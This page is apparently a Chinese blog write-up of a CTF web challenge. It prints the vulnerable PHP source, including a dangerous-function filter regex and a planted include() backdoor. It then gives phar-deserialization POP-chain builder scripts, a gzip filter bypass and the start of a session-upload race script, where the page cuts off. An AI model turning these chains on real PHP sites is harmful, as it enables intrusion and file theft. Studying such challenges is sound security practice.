<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>DASCTF2022.07赋能赛-Web复现 | Yy1n9</title><meta name="keywords" content="ctf,2022"><meta name="author" content="Yy1n9"><meta name="copyright" content="Yy1n9"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="DASCTF2022.07赋能赛-Web链接：官方wp 参考链接 链接 链接 Ez to getflag考点：phar文件包含绕过上传白名单 file_get_contents触发phar反序列化 题解：非预期：  主要是两个功能点，一个上传（png白名单），一个文件读取（存在文件包含漏洞，非预期：直接&#x2F;flag），file.php的f参数进行了..的过滤，但是.&#x2F;可以进行读取源码。 upload">
<meta property="og:type" content="article">
<meta property="og:title" content="DASCTF2022.07赋能赛-Web复现">
<meta property="og:url" content="http://example.com/post/1.html">
<meta property="og:site_name" content="Yy1n9">
<meta property="og:description" content="DASCTF2022.07赋能赛-Web链接：官方wp 参考链接 链接 链接 Ez to getflag考点：phar文件包含绕过上传白名单 file_get_contents触发phar反序列化 题解：非预期：  主要是两个功能点，一个上传（png白名单），一个文件读取（存在文件包含漏洞，非预期：直接&#x2F;flag），file.php的f参数进行了..的过滤，但是.&#x2F;可以进行读取源码。 upload">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/tag.png">
<meta property="article:published_time" content="2022-09-24T07:57:13.218Z">
<meta property="article:modified_time" content="2022-09-24T08:18:25.161Z">
<meta property="article:author" content="Yy1n9">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="2022">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/tag.png"><link rel="shortcut icon" href="/img/touxiang.jpg"><link rel="canonical" href="http://example.com/post/1"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'DASCTF2022.07赋能赛-Web复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-09-24 01:18:25'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/myself/"><i class="fa-fw fa fa-id-card"></i><span> Myself</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/tag.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Yy1n9</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/myself/"><i class="fa-fw fa fa-id-card"></i><span> Myself</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DASCTF2022.07赋能赛-Web复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-24T07:57:13.218Z" title="发表于 2022-09-24 00:57:13">2022-09-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-09-24T08:18:25.161Z" title="更新于 2022-09-24 01:18:25">2022-09-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/php/">php</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>24分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="DASCTF2022.07赋能赛-Web复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="DASCTF2022-07赋能赛-Web"><a href="#DASCTF2022-07赋能赛-Web" class="headerlink" title="DASCTF2022.07赋能赛-Web"></a>DASCTF2022.07赋能赛-Web</h1><h1 id="链接："><a href="#链接：" class="headerlink" title="链接："></a>链接：</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247495952&idx=1&sn=989d3f31b154890ebeea701332b3b893&chksm=fbf46b60cc83e2761c083f40f24f0e41d5e9a1b24e1e9fedd911bec243b6f0dd2883323ccc70&mpshare=1&scene=23&srcid=07266JSqMiz5bR6HIwpDfHDL&sharer_sharetime=1658823612725&sharer_shareid=029344dcf9624c2d719bc3d553ed4aa3#rd">官方wp</a></p>
<p><a target="_blank" rel="noopener" href="https://ek1ng.com/DASCTF2022_7.html">参考链接</a></p>
<p><a target="_blank" rel="noopener" href="https://www.viewofthai.link/2022/08/03/dasctf7%E6%9C%88-%E8%B5%8B%E8%83%BD%E8%B5%9B-wp/">链接</a></p>
<p><a target="_blank" rel="noopener" href="https://www.wolai.com/7MymbpgzhHWMdAoh2Ycb89">链接</a></p>
<h1 id="Ez-to-getflag"><a href="#Ez-to-getflag" class="headerlink" title="Ez to getflag"></a>Ez to getflag</h1><h2 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h2><p>phar文件包含绕过上传白名单</p>
<p>file_get_contents触发phar反序列化</p>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>非预期：</p>
<p><img src="/img/loading.gif" data-original="/img/image-20220910230110-ynlhfca.png" alt="image.png"></p>
<p>主要是两个功能点，一个上传（png白名单），一个文件读取（存在文件包含漏洞，非预期：直接<code>/flag</code>），file.php的f参数进行了<code>..</code>的过滤，但是<code>./</code>可以进行读取源码。</p>
<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line">    <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">uploadfile</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>file.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$fname</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$fsize</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;f = <span class="variable">$_FILES</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">savefile</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">            <span class="variable">$fname</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>; </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$fname</span>)) &#123; </span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$fname</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$fname</span>); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload success! :D&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$cont</span> = <span class="variable language_">$this</span>-&gt;fname;</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable language_">$this</span>-&gt;fsize;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$cont</span>-&gt;<span class="variable">$size</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;this_is_upload&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">uploadfile</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_check</span>()) &#123; </span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">savefile</span>(); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>);</span><br><span class="line">            <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;what are you uploaded? :0&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123;</span><br><span class="line">                    <span class="variable">$filter</span> = <span class="string">&#x27;/&lt;\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i&#x27;</span>;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$filter</span>,<span class="variable">$f</span>))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;what are you doing!! :C&#x27;</span>;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">else</span> &#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;png onlyyy! XP&#x27;</span>; </span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$fname</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="variable">$fname</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|php:|gopher|dict|\.\./i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;illegal fname :P&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">                <span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;source));</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">      </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ok</span>(<span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$arguments</span>)==<span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">                <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">backdoor</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$arguments</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"><span class="variable">$door</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$door</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacked!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;illegal fname XD&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;str=<span class="string">&quot;It&#x27;s works&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>文件都以<code>png</code>为结尾导致即使是进行了<code>%00</code>后缀绕过但是还是无法作为<code>.php</code>文件进行解析，但是在这里知道了文件名命名规则</p>
<p><img src="/img/loading.gif" data-original="/img/image-20220910230736-df2379f.png" alt="image.png"></p>
<p>同时对文件内容进行了检查</p>
<p><img src="/img/loading.gif" data-original="/img/image-20220910231051-r0pj6nr.png" alt="image.png"></p>
<p>文件上传无法利用，就转到文件读取这里</p>
<p><img src="/img/loading.gif" data-original="/img/image-20220910231224-bdivhow.png" alt="image.png"></p>
<p>发现<code>file_get_comtents</code>同时没有过滤掉<code>phar://</code>,可以利用此函数结合phar反序列化，然后寻找可利用点在backdoor方法中看到<code>include</code>函数，构造pop链条：Test类触发Upload类的<code>__toString</code>方法，然后触发Show类的<code>__get</code>方法，接着是<code>__call</code>方法，然后触发backdoor方法的include函数，进行文件包含</p>
<p>首先构造phar文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;str-&gt;fname = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;1.png&#x27;</span>);</span><br><span class="line"><span class="variable">$t</span>-&gt;str-&gt;fsize = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;poc.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span> . <span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$t</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>这里使用gzip来绕过文件上传时对文件内容检测，而文件压缩对phar不会产生影响，将压缩文件进行重命名<code>poc.png</code>,上传之后直接包含即可</p>
<p><img src="/img/loading.gif" data-original="/img/image-20220910235650-xgyxjul.png" alt="image.png"></p>
<p>这里官方wp是利用了session文件包含（通过phpinfo可以查看是否开启<code>session.upload_progress</code>【默认开启】），利用点还是backdoor方法的include函数，这里贴一下phra脚本和竞争脚本</p>
<p><img src="/img/loading.gif" data-original="/img/image-20220911103941-y1ht023.png" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fsize</span>;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;str = <span class="variable">$upload</span>;</span><br><span class="line"><span class="variable">$upload</span>-&gt;fname=<span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$upload</span>-&gt;fsize=<span class="string">&#x27;/tmp/sess_chaaa&#x27;</span>;</span><br><span class="line"><span class="comment">// $test-&gt;str = &#x27;okkkk&#x27;;</span></span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys,threading,requests,re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">PORT = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">check=<span class="literal">True</span></span><br><span class="line"><span class="comment"># 触发phar文件反序列化去包含session上传进度文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">include</span>(<span class="params">fileurl,s</span>):</span><br><span class="line">    <span class="keyword">global</span> check,flag</span><br><span class="line">    <span class="keyword">while</span> check:</span><br><span class="line">        fname = md5(<span class="string">&#x27;shell.png&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()+<span class="string">&#x27;.png&#x27;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;phar://upload/&#x27;</span>+fname</span><br><span class="line">        &#125;</span><br><span class="line">        res = s.get(url=fileurl, params=params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;working&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag = re.findall(<span class="string">&#x27;upload_progress_working(DASCTF&#123;.+&#125;)&#x27;</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">            check = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用session.upload.progress写入临时文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title 